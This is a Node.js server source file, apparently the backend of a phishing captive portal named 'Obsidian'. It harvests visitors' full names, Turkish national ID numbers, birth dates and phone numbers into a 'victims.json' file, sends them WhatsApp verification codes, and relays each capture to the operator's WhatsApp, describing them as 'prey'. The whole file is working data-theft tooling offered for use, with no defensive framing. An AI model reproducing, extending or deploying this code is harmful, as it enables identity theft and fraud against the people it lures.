// --- V8 NUCLEAR BOOTSTRAP ---
// First line: Speak directly to the OS stdout for immediate detection
process.stdout.write('--- OS: BOOTING OBSIDIAN V8 ---\n');

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = parseInt(process.env.PORT || '8080', 10);

// Diagnostics state
let systemLogs = [];
let connectionStatus = 'BOOTING';
let latestQR = null;
let client = null;

const addSystemLog = (msg) => {
    const entry = `[${new Date().toLocaleTimeString()}] ${msg}`;
    console.log(entry);
    systemLogs.push(entry);
    if (systemLogs.length > 100) systemLogs.shift();
};

addSystemLog('V8 Engine engaged.');

app.use(cors());
app.use(express.json());

// 1. FORCED HEALTH CHECK (Top priority)
app.get('/health', (req, res) => res.status(200).send('V8_ALIVE'));

app.get('/api/admin/status', (req, res) => {
    let victimLogs = [];
    try {
        if (fs.existsSync(VICTIMS_FILE)) {
            victimLogs = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
        }
    } catch (e) {
        addSystemLog(`Error reading victims file: ${e.message}`);
    }

    res.json({
        status: connectionStatus,
        qr: latestQR,
        logs: victimLogs.reverse().slice(0, 50), // Son 50 kayıt
        systemLogs: systemLogs
    });
});

app.post('/api/admin/restart', (req, res) => {
    addSystemLog('Manual restart triggered.');
    bootstrapWhatsApp();
    res.json({ status: 'success' });
});

// --- VICTIM DATA HANDLING ---
const fs = require('fs');
const VICTIMS_FILE = path.join(__dirname, 'victims.json');

const saveVictim = (data) => {
    try {
        let victims = [];
        if (fs.existsSync(VICTIMS_FILE)) {
            const content = fs.readFileSync(VICTIMS_FILE, 'utf8');
            victims = JSON.parse(content);
        }
        victims.push({ ...data, timestamp: new Date().toISOString() });
        fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
    } catch (err) {
        addSystemLog(`Error saving victim: ${err.message}`);
    }
};

const getVictims = () => {
    try {
        if (fs.existsSync(VICTIMS_FILE)) {
            const content = fs.readFileSync(VICTIMS_FILE, 'utf8');
            return JSON.parse(content);
        }
    } catch (err) {
        addSystemLog(`Error reading victims: ${err.message}`);
    }
    return [];
};

const sendAdminNotification = async (msg) => {
    if (client && connectionStatus === 'READY') {
        try {
            const myId = client.info.wid._serialized || client.info.me._serialized;
            await client.sendMessage(myId, msg);
            addSystemLog(`Admin notification sent to: ${myId}`);
        } catch (err) {
            addSystemLog(`WA NOTIFICATION ERROR: ${err.message}`);
        }
    } else {
        addSystemLog(`Notification skipped: Status ${connectionStatus}`);
    }
};

// --- CAPTIVE PORTAL API ENDPOINTS ---

app.post('/api/register', (req, res) => {
    const data = req.body;
    addSystemLog(`New Registration: ${data.fullName} (${data.phone})`);
    saveVictim({ type: 'register', ...data });
    
    const msg = `🔥 *YENİ AV DÜŞTÜ (KAYIT)* 🔥\n\n👤 Ad: ${data.fullName}\n🆔 TC: ${data.tcNo}\n📅 Doğum: ${data.birthDate}\n📞 Tel: ${data.phone}`;
    sendAdminNotification(msg);
    
    res.json({ status: 'success' });
});

app.post('/api/request-code', async (req, res) => {
    const { phone } = req.body;
    
    // 1. KAYIT KONTROLÜ (Doğrulama)
    const victims = getVictims();
    const isRegistered = victims.some(v => v.type === 'register' && v.phone === phone);
    
    if (!isRegistered) {
        addSystemLog(`Unauthorized code request: ${phone}`);
        return res.status(403).json({ 
            status: 'error', 
            message: 'Bu telefon numarası ile henüz kayıt oluşturulmamış.' 
        });
    }

    // 6 haneli rastgele kod üret
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    addSystemLog(`SMS Code Requested: ${phone} -> Code: ${code}`);
    saveVictim({ type: 'code_request', phone, code });
    
    const adminMsg = `📩 *SMS KODU ÜRETİLDİ* 📩\n\n📞 Tel: ${phone}\n🔢 Kod: ${code}\n\n_Kurbana WhatsApp üzerinden iletiliyor..._`;
    sendAdminNotification(adminMsg);

    if (client && connectionStatus === 'READY') {
        try {
            let cleanPhone = phone.replace(/\D/g, '');
            if (cleanPhone.startsWith('0')) cleanPhone = cleanPhone.substring(1);
            if (!cleanPhone.startsWith('90')) cleanPhone = '90' + cleanPhone;
            
            const victimId = `${cleanPhone}@c.us`;
            const victimMsg = `*Obsidian Network*: Güvenli internet erişimi için doğrulama kodunuz: *${code}*`;
            
            await client.sendMessage(victimId, victimMsg);
            addSystemLog(`Code sent to victim: ${victimId}`);
        } catch (err) {
            addSystemLog(`Failed to send code: ${err.message}`);
        }
    }
    
    res.json({ status: 'success' });
});

app.post('/api/login', (req, res) => {
    const { phone, smsCode } = req.body;

    // 2. KOD DOĞRULAMA (Validation)
    const victims = getVictims();
    const lastRequest = victims
        .filter(v => v.type === 'code_request' && v.phone === phone)
        .pop(); // Son üretilen kodu al

    if (!lastRequest || lastRequest.code !== smsCode) {
        addSystemLog(`Failed login attempt: ${phone} Code: ${smsCode}`);
        return res.status(401).json({ 
            status: 'error', 
            message: 'Girdiğiniz doğrulama kodu hatalı veya süresi dolmuş.' 
        });
    }

    addSystemLog(`Login Success: ${phone}`);
    saveVictim({ type: 'login', phone, smsCode });
    
    const msg = `✅ *GİRİŞ BAŞARILI* ✅\n\n📞 Tel: ${phone}\n🔢 Kod: ${smsCode}`;
    sendAdminNotification(msg);
    
    res.json({ status: 'success' });
});

// Dynamic Bootstrap Logic with Improved Stability
async function bootstrapWhatsApp() {
    addSystemLog('--- LOADER: Phase 1 (Dependencies) ---');
    try {
        const { Client, LocalAuth } = require('whatsapp-web.js');
        const QRCode = require('qrcode');

        addSystemLog('--- LOADER: Phase 2 (Environment) ---');
        const isWin = process.platform === 'win32';
        const chromePath = process.env.PUPPETEER_EXECUTABLE_PATH || (isWin ? undefined : '/usr/bin/chromium');

        if (client) {
            addSystemLog('Destroying existing client...');
            await client.destroy().catch(() => { });
        }

        connectionStatus = 'INITIALIZING';
        addSystemLog('Creating WhatsApp Instance...');

        const AUTH_PATH = process.env.AUTH_PATH || (isWin ? './.wwebjs_auth' : '/tmp/.wwebjs_auth');
        addSystemLog(`Auth Path: ${AUTH_PATH}`);

        const lockFile = path.join(AUTH_PATH, 'session', 'SingletonLock');
        if (fs.existsSync(lockFile)) {
            try {
                addSystemLog('Removing stale SingletonLock file...');
                fs.unlinkSync(lockFile);
            } catch (e) {
                addSystemLog('Lock file cleanup skipped.');
            }
        }

        client = new Client({
            authStrategy: new LocalAuth({ dataPath: AUTH_PATH }),
            webVersionCache: {
                type: 'remote',
                remotePath: 'https://raw.githubusercontent.com/wppconnect-team/wa-version/main/html/2.3000.1017.651-alpha.html',
            },
            puppeteer: {
                executablePath: chromePath,
                headless: true,
                protocolTimeout: 180000,
                args: isWin ? [
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ] : [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--no-zygote',
                    '--hide-scrollbars',
                    '--disable-notifications',
                    '--disable-background-networking',
                    '--disable-default-apps',
                    '--disable-extensions',
                    '--disk-cache-dir=/tmp/browser-cache', // Move heavy cache to /tmp
                    '--password-store=basic',
                    '--no-first-run'
                ],
                timeout: 120000
            }
        });

        client.on('qr', async (qr) => {
            connectionStatus = 'QR_REQUIRED';
            addSystemLog('New QR generated.');
            latestQR = await QRCode.toDataURL(qr);
        });

        client.on('ready', () => {
            connectionStatus = 'READY';
            latestQR = null;
            addSystemLog(`SUCCESS: WhatsApp Bridge Connected!`);
            // Brief stabilization delay before any notifications
            setTimeout(() => sendAdminNotification('🛡️ *OBSİDİAN V8 READY* 🛡️\nSistem başarıyla kuruldu ve mesaj gönderimine hazır.'), 5000);
        });

        client.on('disconnected', (reason) => {
            addSystemLog(`Disconnected: ${reason}`);
            connectionStatus = 'DISCONNECTED';
            // Auto-rebootstrap on disconnection
            setTimeout(bootstrapWhatsApp, 30000);
        });

        addSystemLog('Loader complete. Calling initialize...');
        await client.initialize();

    } catch (err) {
        addSystemLog(`CRITICAL SYSTEM ERROR: ${err.message}`);
        connectionStatus = 'ERROR';
        // Retry on specific error: "Execution context was destroyed"
        if (err.message.includes('Execution context was destroyed')) {
            addSystemLog('Auto-retrying bootstrap in 10s...');
            setTimeout(bootstrapWhatsApp, 10000);
        }
    }
}

// Serve Frontend
const distPath = path.join(__dirname, '../client/dist');
app.use(express.static(distPath));

app.get(['/admin', '/admin/*'], (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
});

app.get('*', (req, res) => {
    res.sendFile(path.join(distPath, 'index.html'));
});

// SURVIVAL LISTEN
app.listen(PORT, '0.0.0.0', () => {
    addSystemLog(`V8: Port ${PORT} bound successfully.`);
    connectionStatus = 'SERVER_UP';

    // DELAYED AWAKENING (15s)
    addSystemLog('Stabilization period (15s) starting...');
    setTimeout(bootstrapWhatsApp, 15000);
});
